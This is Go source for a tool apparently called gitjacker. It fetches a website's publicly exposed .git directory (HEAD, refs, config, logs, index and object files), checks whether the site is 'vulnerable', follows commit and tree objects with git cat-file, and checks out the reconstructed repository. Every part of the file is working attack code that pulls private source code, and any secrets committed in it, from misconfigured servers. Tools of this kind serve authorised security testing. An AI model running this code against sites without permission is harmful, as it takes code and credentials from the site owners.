package gitjacker

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

var paths = []string{
	"HEAD",
	"refs/heads/master",
	"objects/info/packs",
	"description",
	"config",
	"COMMIT_EDITMSG",
	"index",
	"packed-refs",
	"refs/stash",
	"logs/HEAD",
	"logs/refs/heads/master",
	"logs/refs/remotes/origin/HEAD",
	"info/refs",
	"info/exclude",
	"packed-refs",
}

var ErrNotVulnerable = fmt.Errorf("no .git directory is available at this URL")

type retriever struct {
	baseURL    *url.URL
	outputDir  string
	http       *http.Client
	downloaded map[string]bool
}

func New(target *url.URL, outputDir string) *retriever {

	relative, _ := url.Parse(".git/")
	target = target.ResolveReference(relative)

	return &retriever{
		baseURL:   target,
		outputDir: outputDir,
		http: &http.Client{
			Timeout: time.Second * 10,
		},
		downloaded: make(map[string]bool),
	}
}

func (r *retriever) checkVulnerable() error {
	head, err := r.downloadFile("HEAD")
	if err != nil {
		return err
	}

	if !strings.HasPrefix(string(head), "ref: ") {
		return ErrNotVulnerable
	}

	return nil
}

func (r *retriever) downloadFile(path string) ([]byte, error) {

	path = strings.TrimSpace(path)

	filePath := filepath.Join(r.outputDir, ".git", path)

	fmt.Println(filePath)

	if r.downloaded[path] {
		return ioutil.ReadFile(filePath)
	}
	r.downloaded[path] = true

	relative, err := url.Parse(path)
	if err != nil {
		return nil, err
	}

	absolute := r.baseURL.ResolveReference(relative)
	resp, err := r.http.Get(absolute.String())
	if err != nil {
		return nil, fmt.Errorf("failed to retrieve %s: %w", absolute.String(), err)
	}
	defer func() { _ = resp.Body.Close() }()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("unexpected status code for url %s : %d", absolute.String(), resp.StatusCode)
	}

	content, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	if err := os.MkdirAll(filepath.Dir(filePath), 0755); err != nil {
		return nil, err
	}

	if err := ioutil.WriteFile(filePath, content, 0640); err != nil {
		return nil, err
	}

	if path == "HEAD" {
		return content, nil
	}

	if strings.HasPrefix(path, "refs/heads/") {
		if _, err := r.downloadObject(string(content)); err != nil {
			return nil, err
		}
		return content, nil
	}

	hash := filepath.Base(filepath.Dir(path)) + filepath.Base(path)

	objectType, err := r.getObjectType(hash)
	if err != nil {
		return nil, err
	}

	switch objectType {
	case GitCommitFile:

		commit, err := r.readCommit(hash)
		if err != nil {
			return nil, err
		}

		if commit.Parent != "" {
			if _, err := r.downloadObject(commit.Parent); err != nil {
				return nil, err
			}
		}
		if commit.Tree != "" {
			if _, err := r.downloadObject(commit.Tree); err != nil {
				return nil, err
			}
		}
	case GitTreeFile:

		tree, err := r.readTree(hash)
		if err != nil {
			return nil, err
		}

		for _, subHash := range tree.Objects {
			if _, err := r.downloadObject(subHash); err != nil {
				return nil, err
			}
		}
	case GitBlobFile:
		// fine
	default:
		return nil, fmt.Errorf("unknown git file type for %s: %s", path, objectType)
	}

	return content, nil
}

func (r *retriever) downloadObject(hash string) (string, error) {
	path := fmt.Sprintf("objects/%s/%s", hash[:2], hash[2:40])
	if _, err := r.downloadFile(path); err != nil {
		return "", err
	}
	return path, nil
}

type GitFileType string

const (
	GitUnknownFile GitFileType = ""
	GitCommitFile  GitFileType = "commit"
	GitTreeFile    GitFileType = "tree"
	GitBlobFile    GitFileType = "blob"
)

func (r *retriever) getObjectType(hash string) (GitFileType, error) {
	cmd := exec.Command("git", "cat-file", "-t", hash)
	cmd.Dir = r.outputDir
	output, err := cmd.Output()
	if err != nil {
		return GitUnknownFile, fmt.Errorf("failed to read type of %s: %w", hash, err)
	}
	return GitFileType(strings.TrimSpace(string(output))), nil
}

type Commit struct {
	Tree   string
	Parent string
}

func (r *retriever) readCommit(hash string) (*Commit, error) {
	cmd := exec.Command("git", "cat-file", "-p", hash)
	cmd.Dir = r.outputDir
	output, err := cmd.Output()
	if err != nil {
		return nil, fmt.Errorf("failed to read commit %s: %w", hash, err)
	}
	lines := strings.Split(string(output), "\n")
	var commit Commit
	for _, line := range lines {
		line = strings.TrimSpace(line)
		words := strings.Split(line, " ")
		if len(words) <= 1 {
			continue
		}
		switch words[0] {
		case "tree":
			commit.Tree = words[1]
		case "parent":
			commit.Parent = words[1]
		}
	}
	return &commit, nil
}

type Tree struct {
	Objects []string
}

func (r *retriever) readTree(hash string) (*Tree, error) {

	cmd := exec.Command("git", "cat-file", "-p", hash)
	cmd.Dir = r.outputDir

	output, err := cmd.Output()
	if err != nil {
		return nil, fmt.Errorf("failed to read tree %s: %w", hash, err)
	}

	lines := strings.Split(string(output), "\n")
	var tree Tree
	for _, line := range lines {
		line = strings.TrimSpace(line)
		fmt.Println(line)
		line = strings.ReplaceAll(line, "\t", " ")
		words := strings.Split(line, " ")
		if len(words) < 4 {
			continue
		}
		tree.Objects = append(tree.Objects, words[2])
	}
	return &tree, nil
}

func (r *retriever) checkout() error {
	cmd := exec.Command("git", "checkout", "--", ".")
	cmd.Dir = r.outputDir
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("failed to checkout files: %w", err)
	}
	return nil
}

func (r *retriever) handlePackFiles() error {
	_, err := r.downloadFile("objects/info/packs")
	return err
}

func (r *retriever) Run() error {

	if err := r.checkVulnerable(); err != nil {
		return ErrNotVulnerable
	}

	head, err := r.downloadFile("HEAD")
	if err != nil {
		return err
	}

	ref := strings.TrimPrefix(string(head), "ref: ")
	if _, err := r.downloadFile(ref); err != nil {
		return err
	}

	if err := r.handlePackFiles(); err != nil {
		return err
	}

	// common paths to check, not necessarily required
	for _, path := range paths {
		_, _ = r.downloadFile(path)
	}

	return r.checkout()
}
